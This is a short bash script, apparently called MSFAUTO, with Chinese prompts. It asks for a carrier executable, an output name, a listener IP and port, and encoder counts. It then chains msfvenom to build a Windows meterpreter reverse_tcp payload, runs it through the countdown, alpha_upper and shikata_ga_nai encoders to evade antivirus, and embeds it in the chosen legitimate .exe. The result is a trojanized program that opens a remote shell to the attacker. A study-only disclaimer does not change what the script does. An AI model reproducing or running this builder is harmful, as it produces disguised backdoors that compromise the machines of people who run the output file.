#!/bin/bash

logo1=$'
.------..------..------..------..------..------..------.
|M.--. ||S.--. ||F.--. ||A.--. ||U.--. ||T.--. ||O.--. |
| (\\/) || :/\\: || :(): || (\\/) || (\\/) || :/\\: || :/\\: |
| :\\/ : || :\\/ : || () || :\\/: || : \\/ : ||  || : \\/ : |
| "--"M|| "--"S|| "--"F|| "--"A|| "--"U|| "--"T|| "--"O|
`------\'`------\'`------\'`------\'`------\'`------\'`------\'
'

logo2=$'
  __  __  _____ ______     _    _ _______ ____  
 |  \\/  |/ ____|  ____/\\  | |  | |__   __/ __ \\ 
 | \\  / | (___ | |__ /  \\ | |  | |  | | | |  | |
 | |\\/| |\\___ \\|  __/ /\\ \\| |  | |  | | | |  | |
 | |  | |____) | | / ____ \\ |__| |  | | | |__| |
 |_|  |_|_____/|_|/_/    \\_\\____/   |_|  \\____/ 
                                                
'

random_number=$((RANDOM%2))

if [ "$random_number" -eq 0 ]
then
  echo "$logo1"
else
  echo "$logo2"
fi

echo "本程序仅供学习交流,禁止一切商用以及违法用途,否则一切后果自负"

echo "				Version:F_3.01Q
 "

echo "输入载体名(若未输入后缀,本程序将自动补齐)"
read -p "载体名: " template
template_base=${template%%.*} 
template=${template_base}".exe" 

echo "为输出程序命名(若未输入后缀,本程序将自动补齐)"
read -p "成品名: " output
output_base=${output%%.*}  
output=${output_base}".exe" 
if [ "$template" != "$template_base" ] || [ "$output" != "$output_base" ]; then
  echo "以上名若有误,本程序将自动纠正"
fi

read -p "监听端IP(LHOST): " lhost
read -p "监听者端口(LPORT): " lport
read -p "使用countdown模块次数: " countdown
read -p "使用alpha_upper模块次数: " alpha_upper
read -p "使用shikata_ga_nai模块次数: " shikata_ga_nai

echo "请注意,本程序是内含3个编码模块,最大总编码次数为15次"
total_count=$(($countdown + $alpha_upper + $shikata_ga_nai))
if [ $total_count -gt 15 ]; then
  echo "总编码次数超过了限制(15次)"
  exit 1
fi

echo "LHOST为: $lhost"
echo "LPORT值为: $lport"
# Run
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw | \
msfvenom -a x86 --platform windows -e x86/countdown -i $countdown -f raw - | \
msfvenom -a x86 --platform windows -e x86/alpha_upper -i $alpha_upper -f raw - | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i $shikata_ga_nai -x $template -f exe -o $output
